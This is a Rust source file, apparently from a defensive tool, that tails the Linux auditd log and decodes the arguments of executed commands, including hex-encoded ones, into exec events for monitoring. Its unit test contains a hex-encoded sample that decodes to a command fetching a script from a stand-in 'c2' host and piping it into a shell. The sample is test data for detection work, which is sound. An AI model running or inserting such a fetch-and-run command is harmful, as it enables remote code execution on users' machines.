//! auditd log tailer. Requires root and an execve rule, e.g.
//!   auditctl -a always,exit -F arch=b64 -S execve -k clickfixed
//!
//! Joins SYSCALL (pid/ppid/exe) and EXECVE (argv) records by audit serial.

use super::procfs::proc_info;
use crate::ExecEvent;
use std::collections::HashMap;
use std::error::Error;
use std::fs::File;
use std::io::{BufRead, BufReader, Seek, SeekFrom};
use std::os::unix::fs::MetadataExt;
use std::path::Path;
use std::sync::mpsc::Sender;
use std::time::{Duration, SystemTime};

#[derive(Default)]
struct Syscall {
    pid: Option<u32>,
    ppid: Option<u32>,
    exe: Option<String>,
}

fn serial(line: &str) -> Option<&str> {
    let s = line.split("msg=audit(").nth(1)?;
    s.split(')').next()?.split(':').nth(1)
}

fn field<'a>(line: &'a str, key: &str) -> Option<&'a str> {
    let pat = format!(" {key}=");
    let start = line.find(&pat)? + pat.len();
    let rest = &line[start..];
    if let Some(q) = rest.strip_prefix('"') {
        q.split('"').next()
    } else {
        rest.split(' ').next()
    }
}

/// EXECVE args are quoted, or hex-encoded when they contain spaces/quotes/non-ASCII.
fn decode_arg(raw: &str, quoted: bool) -> String {
    if quoted || !raw.len().is_multiple_of(2) || !raw.bytes().all(|b| b.is_ascii_hexdigit()) {
        return raw.to_string();
    }
    let bytes: Vec<u8> = (0..raw.len())
        .step_by(2)
        .filter_map(|i| u8::from_str_radix(&raw[i..i + 2], 16).ok())
        .collect();
    String::from_utf8_lossy(&bytes).into_owned()
}

pub(crate) fn parse_execve(line: &str) -> Vec<String> {
    let argc: usize = field(line, "argc")
        .and_then(|v| v.parse().ok())
        .unwrap_or(0);
    (0..argc.min(4096))
        .filter_map(|i| {
            let pat = format!(" a{i}=");
            let start = line.find(&pat)? + pat.len();
            let quoted = line[start..].starts_with('"');
            field(line, &format!("a{i}")).map(|v| decode_arg(v, quoted))
        })
        .collect()
}

pub fn tail(path: &Path, tx: Sender<ExecEvent>) -> Result<(), Box<dyn Error + Send + Sync>> {
    let mut file = File::open(path)?;
    file.seek(SeekFrom::End(0))?;
    let mut inode = file.metadata()?.ino();
    let mut reader = BufReader::new(file);
    let mut syscalls: HashMap<String, Syscall> = HashMap::new();
    let mut line = String::new();
    tracing::info!(path = %path.display(), "audit exec tailer running");
    loop {
        line.clear();
        if reader.read_line(&mut line)? == 0 {
            std::thread::sleep(Duration::from_millis(25));
            // Rotation: reopen if the path now points at a new file.
            if let Ok(meta) = std::fs::metadata(path) {
                if meta.ino() != inode {
                    reader = BufReader::new(File::open(path)?);
                    inode = meta.ino();
                }
            }
            continue;
        }
        let Some(sn) = serial(&line).map(str::to_string) else {
            continue;
        };
        if line.starts_with("type=SYSCALL") {
            if syscalls.len() > 4096 {
                syscalls.clear();
            }
            syscalls.insert(
                sn,
                Syscall {
                    pid: field(&line, "pid").and_then(|v| v.parse().ok()),
                    ppid: field(&line, "ppid").and_then(|v| v.parse().ok()),
                    exe: field(&line, "exe").map(str::to_string),
                },
            );
        } else if line.starts_with("type=EXECVE") {
            let sc = syscalls.remove(&sn).unwrap_or_default();
            let ev = ExecEvent {
                pid: sc.pid.unwrap_or(0),
                ppid: sc.ppid,
                argv: parse_execve(&line),
                exe: sc.exe,
                parent_comm: sc.ppid.and_then(|p| proc_info(p).0),
                timestamp: SystemTime::now(),
            };
            if tx.send(ev).is_err() {
                return Ok(());
            }
        }
    }
}

#[cfg(test)]
mod tests {
    use super::*;
    #[test]
    fn parses_hex_and_quoted_args() {
        let l = r#"type=EXECVE msg=audit(1730600000.123:4242): argc=3 a0="bash" a1="-c" a2=6375726C202D7320687474703A2F2F6332207C2073680A"#;
        assert_eq!(serial(l), Some("4242"));
        let argv = parse_execve(l);
        assert_eq!(argv[0], "bash");
        assert_eq!(argv[2].trim(), "curl -s http://c2 | sh");
    }
}
